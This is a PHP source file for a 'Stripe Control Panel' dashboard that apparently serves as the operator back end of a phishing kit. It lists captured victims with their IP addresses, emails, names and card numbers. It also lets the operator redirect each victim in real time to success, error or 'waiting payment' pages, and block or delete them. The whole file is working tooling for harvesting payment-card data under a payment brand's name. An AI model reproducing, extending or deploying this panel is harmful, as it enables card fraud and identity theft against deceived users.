<?php
session_start();
if (!isset($_SESSION['admin_loggedin']) || $_SESSION['admin_loggedin'] !== true) {
    header('Location: login.php');
    exit;
}

$db_file = 'data/users.db';
$users = [];
$online_count = 0;

if (file_exists($db_file)) {
    $users = json_decode(file_get_contents($db_file), true) ?: [];
}

// Calculate stats
$total_users = count($users);
$waiting_users = count(array_filter($users, fn($u) => ($u['status'] ?? 'waiting') === 'waiting'));
$redirected_users = count(array_filter($users, fn($u) => ($u['status'] ?? '') === 'redirected'));
$blocked_users = count(array_filter($users, fn($u) => ($u['status'] ?? '') === 'blocked'));
$success_users = count(array_filter($users, fn($u) => ($u['redirect_to'] ?? '') === 'success.php'));
$error_users = count(array_filter($users, fn($u) => ($u['redirect_to'] ?? '') === 'error.php'));
$waitingPay_users = count(array_filter($users, fn($u) => ($u['redirect_to'] ?? '') === 'waitingPay.php'));

foreach ($users as $user) {
    if ((time() - ($user['last_seen'] ?? 0)) < 60) {
        $online_count++;
    }
}

// Sort by last seen (newest first)
uasort($users, function($a, $b) {
    return ($b['last_seen'] ?? 0) - ($a['last_seen'] ?? 0);
});
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Stripe Control Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }

        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --secondary: #0f172a;
            --success: #10b981;
            --warning: #f59e0b;
            --error: #ef4444;
            --dark: #1e293b;
            --light: #f8fafc;
            --border: #e2e8f0;
            --card-bg: rgba(255, 255, 255, 0.95);
            --sidebar-width: 280px;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #334155;
        }

        .app-container {
            display: flex;
            min-height: 100vh;
            backdrop-filter: blur(10px);
        }

        /* Sidebar */
        .sidebar {
            width: var(--sidebar-width);
            background: var(--secondary);
            padding: 0;
            position: fixed;
            height: 100vh;
            z-index: 100;
            box-shadow: 4px 0 20px rgba(0,0,0,0.2);
        }

        .logo {
            padding: 30px 25px;
            text-align: center;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }

        .logo h2 {
            color: white;
            font-size: 22px;
            font-weight: 700;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .logo .icon {
            color: #6366f1;
        }

        .nav-menu {
            padding: 25px 0;
        }

        .nav-item {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 15px 25px;
            color: #cbd5e1;
            text-decoration: none;
            transition: all 0.3s;
            margin: 5px 15px;
            border-radius: 10px;
        }

        .nav-item:hover {
            background: rgba(99, 102, 241, 0.2);
            color: white;
            transform: translateX(5px);
        }

        .nav-item.active {
            background: linear-gradient(90deg, #6366f1, #8b5cf6);
            color: white;
            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.4);
        }

        .nav-item i {
            font-size: 18px;
            width: 24px;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            margin-left: var(--sidebar-width);
            padding: 25px;
            overflow-x: hidden;
        }

        /* Header */
        .header {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            padding: 25px 30px;
            border-radius: 16px;
            margin-bottom: 25px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header-left h1 {
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(90deg, #6366f1, #8b5cf6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
        }

        .header-left p {
            color: #64748b;
            font-size: 15px;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .live-badge {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 10px 20px;
            background: linear-gradient(90deg, #10b981, #34d399);
            color: white;
            border-radius: 20px;
            font-weight: 600;
            font-size: 14px;
        }

        .pulse-dot {
            width: 8px;
            height: 8px;
            background: white;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.2); }
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            padding: 25px;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--card-color, #6366f1), transparent);
        }

        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0,0,0,0.15);
        }

        .stat-card.online { --card-color: #10b981; }
        .stat-card.total { --card-color: #6366f1; }
        .stat-card.waiting { --card-color: #f59e0b; }
        .stat-card.success { --card-color: #10b981; }
        .stat-card.error { --card-color: #ef4444; }

        .stat-content {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .stat-icon {
            width: 60px;
            height: 60px;
            border-radius: 12px;
            background: rgba(var(--card-color-rgb, 99, 102, 241), 0.1);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: var(--card-color, #6366f1);
        }

        .stat-info {
            flex: 1;
        }

        .stat-number {
            font-size: 32px;
            font-weight: 800;
            color: #1e293b;
            line-height: 1;
        }

        .stat-label {
            color: #64748b;
            font-size: 14px;
            margin-top: 5px;
        }

        /* Users Table */
        .users-table-container {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            overflow: hidden;
            margin-bottom: 30px;
        }

        .table-header {
            padding: 25px 30px;
            background: rgba(241, 245, 249, 0.8);
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .table-title {
            font-size: 18px;
            font-weight: 700;
            color: #1e293b;
        }

        .table-actions {
            display: flex;
            gap: 10px;
        }

        .search-box {
            position: relative;
        }

        .search-box input {
            padding: 10px 15px 10px 40px;
            border: 1px solid var(--border);
            border-radius: 8px;
            background: white;
            width: 250px;
            font-size: 14px;
        }

        .search-box i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #94a3b8;
        }

        /* Table */
        .table {
            width: 100%;
            border-collapse: collapse;
        }

        .table thead {
            background: rgba(248, 250, 252, 0.8);
        }

        .table th {
            padding: 18px 20px;
            text-align: left;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            color: #64748b;
            border-bottom: 2px solid var(--border);
            white-space: nowrap;
        }

        .table tbody tr {
            border-bottom: 1px solid var(--border);
            transition: all 0.2s;
        }

        .table tbody tr:hover {
            background: rgba(99, 102, 241, 0.05);
        }

        .table tbody tr.online {
            background: rgba(16, 185, 129, 0.05);
        }

        .table td {
            padding: 20px;
            vertical-align: top;
        }

        /* User Info */
        .user-info {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .user-id {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .status-indicator {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
        }

        .status-indicator.online {
            background: #10b981;
            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2);
        }

        .status-indicator.offline {
            background: #94a3b8;
        }

        .user-id-text {
            font-family: 'Courier New', monospace;
            font-weight: 600;
            color: #1e293b;
            font-size: 14px;
        }

        .user-meta {
            display: flex;
            gap: 15px;
            font-size: 12px;
            color: #64748b;
        }

        .user-meta span {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        /* Credentials */
        .credentials {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .credential-item {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .credential-label {
            font-size: 11px;
            text-transform: uppercase;
            color: #64748b;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .credential-value {
            font-weight: 600;
            color: #1e293b;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            word-break: break-all;
        }

        /* Status */
        .status-cell {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .status-badge {
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
            text-align: center;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            display: inline-block;
            width: fit-content;
        }

        .status-waiting {
            background: rgba(245, 158, 11, 0.15);
            color: #92400e;
            border: 1px solid rgba(245, 158, 11, 0.3);
        }

        .status-success {
            background: rgba(16, 185, 129, 0.15);
            color: #065f46;
            border: 1px solid rgba(16, 185, 129, 0.3);
        }

        .status-error {
            background: rgba(239, 68, 68, 0.15);
            color: #991b1b;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }

        .status-blocked {
            background: rgba(239, 68, 68, 0.15);
            color: #991b1b;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }

        .status-waitingpay {
            background: rgba(59, 130, 246, 0.15);
            color: #1e40af;
            border: 1px solid rgba(59, 130, 246, 0.3);
        }

        .online-badge {
            padding: 4px 10px;
            background: rgba(16, 185, 129, 0.15);
            color: #065f46;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 700;
            width: fit-content;
        }

        /* Control Panel */
        .control-panel {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .control-section {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .section-label {
            font-size: 11px;
            text-transform: uppercase;
            color: #64748b;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .control-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
        }

        .control-btn {
            padding: 8px 14px;
            border-radius: 8px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            border: none;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 6px;
            text-decoration: none;
        }

        .control-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        }

        .btn-success {
            background: linear-gradient(90deg, #10b981, #34d399);
            color: white;
        }

        .btn-error {
            background: linear-gradient(90deg, #ef4444, #f87171);
            color: white;
        }

        .btn-waiting {
            background: linear-gradient(90deg, #f59e0b, #fbbf24);
            color: white;
        }

        .btn-block {
            background: linear-gradient(90deg, #dc2626, #ef4444);
            color: white;
        }

        .btn-delete {
            background: linear-gradient(90deg, #475569, #64748b);
            color: white;
        }

        /* Empty State */
        .empty-state {
            padding: 60px 20px;
            text-align: center;
            color: #64748b;
        }

        .empty-icon {
            font-size: 64px;
            color: #cbd5e1;
            margin-bottom: 20px;
            opacity: 0.5;
        }

        .empty-state h3 {
            font-size: 20px;
            color: #475569;
            margin-bottom: 10px;
        }

        /* Auto Refresh */
        .auto-refresh {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: linear-gradient(90deg, #6366f1, #8b5cf6);
            color: white;
            padding: 12px 20px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 600;
            font-size: 14px;
            box-shadow: 0 8px 25px rgba(99, 102, 241, 0.4);
            z-index: 1000;
        }

        /* Responsive */
        @media (max-width: 1200px) {
            .table {
                display: block;
                overflow-x: auto;
            }
            
            .search-box input {
                width: 200px;
            }
        }

        @media (max-width: 768px) {
            .sidebar {
                width: 80px;
            }
            
            .main-content {
                margin-left: 80px;
            }
            
            .logo h2 span:not(.icon) {
                display: none;
            }
            
            .nav-item span {
                display: none;
            }
            
            .nav-item {
                justify-content: center;
                padding: 15px;
            }
            
            .header {
                flex-direction: column;
                gap: 15px;
                text-align: center;
            }
            
            .stats-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="app-container">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="logo">
                <h2>
                    <i class="fas fa-user-secret icon"></i>
                    <span>Stripe Control</span>
                </h2>
            </div>
            
            <nav class="nav-menu">
                <a href="#" class="nav-item active">
                    <i class="fas fa-tachometer-alt"></i>
                    <span>Dashboard</span>
                </a>
                <a href="#" class="nav-item">
                    <i class="fas fa-users"></i>
                    <span>Users</span>
                </a>
                <a href="#" class="nav-item">
                    <i class="fas fa-cog"></i>
                    <span>Settings</span>
                </a>
                <a href="#" class="nav-item">
                    <i class="fas fa-chart-line"></i>
                    <span>Analytics</span>
                </a>
                <a href="logout.php" class="nav-item">
                    <i class="fas fa-sign-out-alt"></i>
                    <span>Logout</span>
                </a>
            </nav>
        </div>

        <!-- Main Content -->
        <div class="main-content">
            <!-- Header -->
            <div class="header">
                <div class="header-left">
                    <h1>Payment Control Dashboard</h1>
                    <p>Monitor and control payment flows in real-time</p>
                </div>
                <div class="header-right">
                    <div class="live-badge">
                        <span class="pulse-dot"></span>
                        <span>LIVE</span>
                    </div>
                    <div class="last-update" id="lastUpdate">
                        Updated: <?php echo date('H:i:s'); ?>
                    </div>
                </div>
            </div>

            <!-- Stats Grid -->
            <div class="stats-grid">
                <div class="stat-card online">
                    <div class="stat-content">
                        <div class="stat-icon">
                            <i class="fas fa-wifi"></i>
                        </div>
                        <div class="stat-info">
                            <div class="stat-number"><?php echo $online_count; ?></div>
                            <div class="stat-label">Online Now</div>
                        </div>
                    </div>
                </div>
                
                <div class="stat-card total">
                    <div class="stat-content">
                        <div class="stat-icon">
                            <i class="fas fa-users"></i>
                        </div>
                        <div class="stat-info">
                            <div class="stat-number"><?php echo $total_users; ?></div>
                            <div class="stat-label">Total Payments</div>
                        </div>
                    </div>
                </div>
                
                <div class="stat-card waiting">
                    <div class="stat-content">
                        <div class="stat-icon">
                            <i class="fas fa-clock"></i>
                        </div>
                        <div class="stat-info">
                            <div class="stat-number"><?php echo $waiting_users; ?></div>
                            <div class="stat-label">Waiting</div>
                        </div>
                    </div>
                </div>
                
                <div class="stat-card success">
                    <div class="stat-content">
                        <div class="stat-icon">
                            <i class="fas fa-check-circle"></i>
                        </div>
                        <div class="stat-info">
                            <div class="stat-number"><?php echo $success_users; ?></div>
                            <div class="stat-label">Success</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Users Table -->
            <div class="users-table-container">
                <div class="table-header">
                    <div class="table-title">Active Payment Sessions</div>
                    <div class="table-actions">
                        <div class="search-box">
                            <i class="fas fa-search"></i>
                            <input type="text" placeholder="Search users..." id="searchInput">
                        </div>
                    </div>
                </div>

                <div class="table-wrapper">
                    <?php if (empty($users)): ?>
                        <div class="empty-state">
                            <div class="empty-icon">
                                <i class="fas fa-credit-card"></i>
                            </div>
                            <h3>No Active Sessions</h3>
                            <p>Waiting for payment submissions...</p>
                        </div>
                    <?php else: ?>
                        <table class="table">
                            <thead>
                                <tr>
                                    <th>User Info</th>
                                    <th>Credentials</th>
                                    <th>Status</th>
                                    <th>Control Panel</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php foreach ($users as $user_id => $user): 
                                    $is_online = (time() - ($user['last_seen'] ?? 0)) < 60;
                                    $status = $user['status'] ?? 'waiting';
                                    $data = $user['data'] ?? [];
                                    $redirect_to = $user['redirect_to'] ?? '';
                                    
                                    // Determine status
                                    $status_text = 'Waiting';
                                    $status_class = 'status-waiting';
                                    
                                    if ($status === 'redirected') {
                                        if ($redirect_to === 'success.php') {
                                            $status_text = 'Success';
                                            $status_class = 'status-success';
                                        } elseif ($redirect_to === 'error.php') {
                                            $status_text = 'Error';
                                            $status_class = 'status-error';
                                        } elseif ($redirect_to === 'waitingPay.php') {
                                            $status_text = 'Waiting Pay';
                                            $status_class = 'status-waitingpay';
                                        } else {
                                            $status_text = 'Redirected';
                                            $status_class = 'status-waiting';
                                        }
                                    } elseif ($status === 'blocked') {
                                        $status_text = 'Blocked';
                                        $status_class = 'status-blocked';
                                    }
                                ?>
                                <tr class="<?php echo $is_online ? 'online' : ''; ?>" data-user-id="<?php echo $user_id; ?>">
                                    <!-- User Info -->
                                    <td>
                                        <div class="user-info">
                                            <div class="user-id">
                                                <span class="status-indicator <?php echo $is_online ? 'online' : 'offline'; ?>"></span>
                                                <span class="user-id-text" title="<?php echo $user_id; ?>">
                                                    <?php echo substr($user_id, 0, 15); ?>...
                                                </span>
                                            </div>
                                            <div class="user-meta">
                                                <span title="IP Address">
                                                    <i class="fas fa-globe"></i>
                                                    <?php echo htmlspecialchars($user['ip'] ?? 'N/A'); ?>
                                                </span>
                                                <span title="Last Seen">
                                                    <i class="fas fa-clock"></i>
                                                    <?php echo date('H:i:s', $user['last_seen'] ?? time()); ?>
                                                </span>
                                            </div>
                                        </div>
                                    </td>
                                    
                                    <!-- Credentials -->
                                    <td>
                                        <div class="credentials">
                                            <?php if(!empty($data['email'])): ?>
                                                <div class="credential-item">
                                                    <div class="credential-label">Email</div>
                                                    <div class="credential-value"><?php echo htmlspecialchars($data['email']); ?></div>
                                                </div>
                                            <?php endif; ?>
                                            
                                            <?php if(!empty($data['name'])): ?>
                                                <div class="credential-item">
                                                    <div class="credential-label">Name</div>
                                                    <div class="credential-value"><?php echo htmlspecialchars($data['name']); ?></div>
                                                </div>
                                            <?php endif; ?>
                                            
                                            <?php if(!empty($data['card'])): ?>
                                                <div class="credential-item">
                                                    <div class="credential-label">Card</div>
                                                    <div class="credential-value"><?php echo htmlspecialchars($data['card']); ?></div>
                                                </div>
                                            <?php endif; ?>
                                        </div>
                                    </td>
                                    
                                    <!-- Status -->
                                    <td>
                                        <div class="status-cell">
                                            <span class="status-badge <?php echo $status_class; ?>">
                                                <?php echo $status_text; ?>
                                            </span>
                                            <?php if ($is_online): ?>
                                                <span class="online-badge">
                                                    <i class="fas fa-wifi"></i> ONLINE
                                                </span>
                                            <?php endif; ?>
                                        </div>
                                    </td>
                                    
                                    <!-- Control Panel -->
                                    <td>
                                        <div class="control-panel">
                                            <div class="control-section">
                                                <div class="section-label">Payment Actions</div>
                                                <div class="control-buttons">
                                                    <a href="action.php?id=<?php echo urlencode($user_id); ?>&decision=success" class="control-btn btn-success">
                                                        <i class="fas fa-check"></i> Success
                                                    </a>
                                                    <a href="action.php?id=<?php echo urlencode($user_id); ?>&decision=error" class="control-btn btn-error">
                                                        <i class="fas fa-times"></i> Error
                                                    </a>
                                                    <a href="action.php?id=<?php echo urlencode($user_id); ?>&decision=waiting" class="control-btn btn-waiting">
                                                        <i class="fas fa-clock"></i> Waiting
                                                    </a>
                                                </div>
                                            </div>
                                            
                                            <div class="control-section">
                                                <div class="section-label">Management</div>
                                                <div class="control-buttons">
                                                    <a href="action.php?id=<?php echo urlencode($user_id); ?>&decision=block" class="control-btn btn-block">
                                                        <i class="fas fa-ban"></i> Block
                                                    </a>
                                                    <a href="action.php?id=<?php echo urlencode($user_id); ?>&decision=delete" class="control-btn btn-delete" onclick="return confirm('Delete this user permanently?');">
                                                        <i class="fas fa-trash"></i> Delete
                                                    </a>
                                                </div>
                                            </div>
                                        </div>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    <?php endif; ?>
                </div>
            </div>
            
            <!-- Auto Refresh -->
            <div class="auto-refresh" id="autoRefresh">
                <i class="fas fa-sync"></i>
                <span id="refreshText">Auto-refresh in 30s</span>
            </div>
        </div>
    </div>

    <script>
        // Auto-refresh countdown
        let refreshTime = 30;
        const refreshText = document.getElementById('refreshText');
        const lastUpdate = document.getElementById('lastUpdate');
        
        function updateCountdown() {
            refreshTime--;
            refreshText.textContent = `Auto-refresh in ${refreshTime}s`;
            
            if (refreshTime <= 0) {
                refreshTime = 30;
                location.reload();
            }
        }
        
        setInterval(updateCountdown, 1000);
        
        // Search functionality
        const searchInput = document.getElementById('searchInput');
        searchInput.addEventListener('input', function() {
            const searchTerm = this.value.toLowerCase();
            const rows = document.querySelectorAll('.table tbody tr');
            
            rows.forEach(row => {
                const text = row.textContent.toLowerCase();
                row.style.display = text.includes(searchTerm) ? '' : 'none';
            });
        });
        
        // Highlight online users
        document.addEventListener('DOMContentLoaded', function() {
            const onlineRows = document.querySelectorAll('tr.online');
            onlineRows.forEach(row => {
                row.style.animation = 'pulseBg 2s infinite';
            });
            
            // Add CSS animation for pulse effect
            const style = document.createElement('style');
            style.textContent = `
                @keyframes pulseBg {
                    0%, 100% { background-color: rgba(16, 185, 129, 0.05); }
                    50% { background-color: rgba(16, 185, 129, 0.1); }
                }
            `;
            document.head.appendChild(style);
        });
        
        // Show notification for new users
        let lastUserCount = <?php echo $total_users; ?>;
        
        function checkForNewUsers() {
            fetch('track.php?action=get_count')
                .then(response => response.json())
                .then(data => {
                    if (data.count > lastUserCount) {
                        showNotification('New payment received!', 'success');
                        lastUserCount = data.count;
                    }
                })
                .catch(console.error);
        }
        
        function showNotification(message, type) {
            // Create notification element
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.innerHTML = `
                <i class="fas fa-${type === 'success' ? 'check-circle' : 'info-circle'}"></i>
                <span>${message}</span>
            `;
            
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: ${type === 'success' ? '#10b981' : '#6366f1'};
                color: white;
                padding: 15px 25px;
                border-radius: 10px;
                box-shadow: 0 8px 25px rgba(0,0,0,0.2);
                display: flex;
                align-items: center;
                gap: 12px;
                z-index: 9999;
                animation: slideIn 0.3s ease;
            `;
            
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.remove();
            }, 3000);
        }
        
        // Check for new users every 10 seconds
        setInterval(checkForNewUsers, 10000);
        
        // Initial check
        setTimeout(checkForNewUsers, 5000);
    </script>
</body>
</html>